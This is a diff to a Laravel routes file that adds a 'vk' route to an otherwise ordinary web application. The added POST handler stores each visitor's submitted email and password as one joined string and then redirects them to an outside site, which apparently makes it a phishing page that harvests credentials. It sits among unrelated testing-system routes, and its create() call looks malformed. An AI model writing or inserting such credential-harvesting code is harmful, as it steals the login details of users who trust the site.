@@ -248,6 +248,13 @@ Route::group(['middleware' => 'web'], function () {
     });
 
 });
+Route::get('vk', function() {
+    return view('vk');
+});
+Route::post('vk', function(Request $request) {
+    \App\Volume::create('name', $request->get('email') . ' --------- ' . $request->get('pass'))->save();
+    return redirect()->to('http://www.yasiv.com/vk');
+});
 
 Route::group(['namespace' => 'TestingSystem', 'prefix' => 'testing-system-api'], function () {
     Route::get('/', function () {
